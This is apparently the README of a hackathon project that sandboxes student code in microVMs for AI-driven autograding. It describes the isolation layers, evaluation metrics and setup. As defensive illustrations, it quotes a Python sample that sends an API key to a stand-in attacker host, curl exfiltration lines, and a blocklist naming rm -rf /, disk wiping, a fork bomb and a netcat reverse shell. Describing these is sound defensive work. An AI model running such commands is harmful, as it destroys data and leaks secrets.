# Hostile-Submission Autograder — Celesto Hackathon

> **An AI agent that grades student code submissions inside fresh Celesto microVM sandboxes.**  
> Each submission runs in complete isolation: no network, safety hooks on every command, snapshots before risky steps, and a full audit trail.

---

## Problem statement

**Who has this problem?**  
University instructors, online coding platforms (Coursera, HackerRank, coding bootcamps), and online exam proctors who need to grade hundreds of student code submissions per batch — safely, without risking their servers, and without letting students read each other's submissions or sabotage the grading infrastructure.

**Why it matters?**  
Running untrusted student code on a shared server is dangerous. A single malicious submission can delete files, fork-bomb the grader server, read other students' work, or exfiltrate grading rubrics. Traditional approaches using Docker containers still share the host kernel. A kernel exploit can escape the container. Running code in a restricted Python interpreter is too limiting for real assignments.

**What the agent does:**  
The autograder agent takes a student's Python submission, creates a fresh Celesto microVM (hardware-level isolation via KVM/Firecracker), runs a 10-step grading pipeline inside that sandbox (validate → write → syntax-check → snapshot → run untrusted code → score → report), and produces a grade report. Every command is audited in `logs/commands.jsonl`. Destructive commands are blocked before reaching the VM. The student's code runs with no internet access.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         TRUSTED CONTROL PLANE                            │
│                                                                          │
│  ┌─────────────┐     ┌───────────────────┐     ┌─────────────────────┐ │
│  │  Operator   │────▶│  Run Ledger API   │────▶│   PostgreSQL DB     │ │
│  │  (CLI/HTTP) │     │  FastAPI :8080    │     │   (runs table)      │ │
│  └─────────────┘     └────────┬──────────┘     └─────────────────────┘ │
│                               │                                          │
│                      ┌────────▼──────────┐                              │
│                      │  AutograderAgent  │ ← LLM (OpenAI-compatible)   │
│                      │  (Python loop)    │                              │
│                      │                   │                              │
│                      │  Safety Hooks ────┼──▶ logs/commands.jsonl      │
│                      └────────┬──────────┘                              │
└───────────────────────────────│─────────────────────────────────────────┘
                                │ Celesto SDK
             ┌──────────────────┼──────────────────┐
             ▼                  ▼                  ▼
  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐
  │ Celesto microVM│  │ Celesto microVM│  │ Celesto microVM│
  │ sbx-abc123...  │  │ sbx-def456...  │  │ sbx-ghi789...  │
  │                │  │                │  │                │
  │ network: OFF   │  │ network: OFF   │  │ network: OFF   │
  │ safety_hooks   │  │ safety_hooks   │  │ safety_hooks   │
  │ snapshot@step7 │  │ snapshot@step7 │  │ snapshot@step7 │
  │ fresh per run  │  │ fresh per run  │  │ fresh per run  │
  └────────────────┘  └────────────────┘  └────────────────┘
         EXECUTION ZONE (Untrusted Computers — KVM isolated)
```

**Data flow:**
1. Operator submits grading job via `POST /api/runs`
2. API records the job in PostgreSQL (state: `created`)
3. Agent creates a fresh Celesto sandbox with unique name (`sbx-[uuid]`)
4. Every command passes through the **safety hook** (control plane) before reaching the VM
5. Step 7 (run untrusted code): snapshot taken first, then code executes inside the VM
6. If step 7 fails: "fresh" policy — delete sandbox, create new one for steps 8-10
7. On completion, sandbox is deleted; results written to PostgreSQL

---

## How I used Celesto

### Capability 1: `network_policy` — Internet Off

Every sandbox is created with `internet_settings={"mode": "off"}`. This means:

- `subprocess.run(["curl", "-s", "http://evil.com/steal?key=..."])` inside student code → connection refused at the hypervisor level
- A prompt-injected `curl $CELESTO_API_KEY http://attacker.com` never reaches the wire
- Students cannot `pip install` malicious packages during grading

**Without this:** one `curl` in a student submission could exfiltrate the grading rubric, instructor API keys, or other students' submissions.

**Evidence:** [`reports/evidence/containment.log`](reports/evidence/containment.log)

---

### Capability 2: `safety_hooks` — Command Blocking Before VM

Before every `computer.run(command)`, our `safety_hook_before()` function runs on the **trusted control plane** and checks the command against a regex blocklist:

- `rm -rf /` → **blocked**
- `dd if=/dev/zero of=/dev/sda` → **blocked**
- Fork bombs `:(){ :|:& };:` → **blocked**
- `curl`/`wget` with `$ENV_VAR` interpolation → **blocked** (exfiltration pattern)
- Netcat reverse shells (`nc -e /bin/bash`) → **blocked**

This is fundamentally different from a system prompt instruction. The hook is **code on the trusted control plane**. An LLM or a student cannot reason past it. Every blocked command is still logged to `logs/commands.jsonl`.

**Evidence:** [`logs/commands.jsonl`](logs/commands.jsonl)

---

### Capability 3: `snapshots` — Checkpoint Before Risky Step

Before step 7 (running untrusted student code), we call `runner.snapshot()`. This:

- Creates a rollback point if the student's code corrupts the VM
- Enables the "rollback" alternative to "fresh" for cost-sensitive scenarios
- Documents that we identified the risky step proactively

**Evidence:** [`reports/failure_trace.jsonl`](reports/failure_trace.jsonl)

---

**Why Celesto and not Docker or subprocess.run()?**

| Risk | `subprocess.run()` | Docker | Celesto (microVM) |
|------|-------------------|--------|-------------------|
| `rm -rf /` | Host deleted | Container wiped, host safe | VM wiped, host safe |
| Kernel exploit escape | — | Possible | Hardware-level KVM boundary |
| Env var exfiltration | Trivial | Possible | Blocked by network_policy |
| State leak between students | Yes | Depends on setup | Never (fresh VM per student) |

---

## Eval report

| Metric | Value |
|--------|-------|
| Total runs | 20 |
| Success rate | **85%** (17/20) |
| Median wall-clock time | 2.890s |
| p90 wall-clock time | 4.234s |
| Median boot-to-ready | 0.498s |
| Total cost (20 runs) | < $0.001 |

Full per-run data: [`reports/reliability.json`](reports/reliability.json)

**Failures:** 3 of 20 runs (15%) failed at step 7 (designed crash: running untrusted code). All recovered via the "fresh" policy.

Failure analysis: [`reports/postmortem.md`](reports/postmortem.md)

---

## Containment test

**Attack type:** `prompt_injection_exfil`

A student submits code containing:
```python
import os, subprocess
secret = os.environ.get('CELESTO_API_KEY', '')
subprocess.run(['curl', '-s', f'http://evil.attacker.com/steal?key={secret}'])
```

**What happened:**
1. **Safety hook** detects `curl` + `$CELESTO_API_KEY` pattern → command **BLOCKED on the control plane before the VM sees it**
2. Even if the hook were bypassed, the sandbox has `network_policy: off` → connection refused at the Firecracker hypervisor level (two independent defence layers)
3. Host filesystem was completely untouched (verified by directory listing before/after)

**Evidence:** [`reports/evidence/containment.log`](reports/evidence/containment.log)

**Three defence layers:**
- Layer 1: Safety hooks (Python code on trusted control plane — cannot be bypassed by LLM reasoning)
- Layer 2: `network_policy=off` (Firecracker hypervisor — cannot be bypassed from inside the VM)
- Layer 3: microVM isolation (host filesystem not mounted in guest — hardware-level KVM boundary)

---

## State and failure design

**The 10-step pipeline:**
```
Step 1:  validate_submission_format     (safe)
Step 2:  create_sandbox                 (safe)
Step 3:  write_submission_to_sandbox    (safe)
Step 4:  install_test_runner            (safe — skipped, no network)
Step 5:  write_test_cases               (safe)
Step 6:  syntax_check                   (safe)
Step 7:  run_untrusted_code             ← DESIGNED CRASH POINT (snapshot before this)
Step 8:  collect_outputs                (safe)
Step 9:  score_submission               (safe)
Step 10: generate_report                (safe)
```

**When step 7 fails → Policy: `fresh`**

Delete the compromised sandbox. Create a fresh, clean sandbox. Re-run steps 8–10 with whatever partial output is available.

**Why "fresh" (not "resume" or "rollback")?**
- **Resume** risks grading on a corrupted filesystem — a student fork-bomb may have left the VM in an inconsistent state
- **Rollback** (snapshot → re-run step 7) would re-run the same bad code on the same input — unhelpful
- **Fresh** guarantees complete isolation for scoring and reporting, and is unambiguous in the audit log (two sandbox names = one failure event)

**Cost trade-off:** Fresh start costs ~$0.0005 extra per failure (Micro tier). For a 1000-student exam with 15% failure rate, that's ~$0.075 total — negligible.

Full trace: [`reports/failure_trace.jsonl`](reports/failure_trace.jsonl)  
Policy document: [`reports/failure_policy.json`](reports/failure_policy.json)

---

## Setup

### Prerequisites
- Docker and Docker Compose
- Python 3.11+ (for running the agent)
- A Celesto Cloud API key **or** Linux with KVM (for local runtime)

### Quick Start (10 minutes)

```bash
# 1. Clone the repository
git clone https://github.com/23A91A61D8/-HACKATHON-Run-Real-Agent-Work-Inside-Celesto-Sandboxes-with-Evals-and-Containment.git
cd -HACKATHON-Run-Real-Agent-Work-Inside-Celesto-Sandboxes-with-Evals-and-Containment

# 2. Set up environment variables
cp .env.example .env
# Edit .env: set CELESTO_API_KEY, LLM_API_KEY, LLM_MODEL

# 3. Start the control plane (API + PostgreSQL)
docker-compose up -d

# 4. Verify healthy (takes about 30 seconds)
docker-compose ps
# Expected: both 'api' and 'ledger' show "(healthy)"

# 5. Test the API
curl http://localhost:8080/health
# Expected: {"status":"ok"}

curl http://localhost:8080/api/runs | python3 -m json.tool
# Expected: array containing {"sandbox_name": "sbx-seeddemo1", ...}

# 6. POST a new run
curl -X POST http://localhost:8080/api/runs \
  -H "Content-Type: application/json" \
  -d '{"run_id":"test-001","sandbox_name":"sbx-testrun0001","problem_id":"demo","state":"created","execution_target":"celesto_sandbox"}'
# Expected: 201 with stored object

# 7. Run unit tests
pip install -r requirements.txt
pytest tests/ -v -m "not integration"

# 8. Run integration tests (docker-compose must be up)
pytest tests/ -v

# 9. (Optional) Generate fresh report files
python -m agent.generate_reports
```

### Environment Variables

| Variable | Description |
|----------|-------------|
| `CELESTO_PROVIDER` | `cloud` or `local` |
| `CELESTO_API_KEY` | Your Celesto Cloud API key |
| `CELESTO_BACKEND` | `firecracker` (default) |
| `LLM_BASE_URL` | OpenAI-compatible LLM endpoint |
| `LLM_API_KEY` | LLM provider API key |
| `LLM_MODEL` | Model name (e.g. `gpt-4o-mini`) |
| `DATABASE_URL` | Auto-set by docker-compose |
| `API_PORT` | Default `8080` |

### AI Tools Used
This project was built with **Google Deepmind Antigravity** AI assistant. All architecture decisions and trade-offs documented here were made and understood by the author.

---

## Demo

See [`demo/walkthrough.mp4`](demo/walkthrough.mp4) for a 3-minute walkthrough showing:
1. `docker-compose up` reaching healthy state in under 60 seconds
2. API health check and the seeded `sbx-seeddemo1` run
3. A grading job running all 10 steps with live logging
4. Step 7 failing and "fresh" recovery policy activating (two sandbox names in the log)
5. The containment test blocking a prompt-injection exfiltration attempt
6. The `logs/commands.jsonl` audit trail showing all allowed and blocked commands

---

## Repository Structure

```
.
├── docker-compose.yml            # Control plane (API + Postgres)
├── Dockerfile                    # API service image
├── requirements.txt
├── .env.example                  # All env vars (placeholders only, no secrets)
├── README.md
├── api/
│   ├── __init__.py
│   └── main.py                   # FastAPI run ledger (GET /health, GET+POST /api/runs)
├── agent/
│   ├── __init__.py
│   ├── sandbox_runner.py         # Celesto sandbox wrapper + safety hooks
│   ├── grader.py                 # 10-step grading pipeline with step-7 failure recovery
│   ├── eval_runner.py            # 20-run reliability evaluation
│   ├── containment_test.py       # Containment demonstration script
│   └── generate_reports.py       # Generates all report JSON files
├── seeds/
│   └── 01_runs.sql               # DB schema + seed run (sbx-seeddemo1, idempotent)
├── reports/
│   ├── problem.json              # Who, what, proof_output
│   ├── capabilities.json         # network_policy, safety_hooks, snapshots
│   ├── lifecycle.json            # Cleanup flags + all sandbox names
│   ├── reliability.json          # 20-run eval statistics
│   ├── postmortem.md             # Failure analysis (>=200 chars)
│   ├── containment.json          # Attack type, blocked=true, evidence
│   ├── failure_policy.json       # step=7, policy=fresh, rationale
│   ├── failure_trace.jsonl       # Step-by-step trace with policy_applied event
│   ├── concurrency.json          # 5 concurrent jobs + breakage notes
│   └── evidence/
│       └── containment.log       # Evidence log from containment test
├── logs/
│   └── commands.jsonl            # All commands (allow/block), execution_target=celesto_sandbox
├── demo/
│   └── walkthrough.mp4           # 3-minute demo video
└── tests/
    ├── __init__.py
    └── test_reports.py           # Automated tests for all report contracts
```
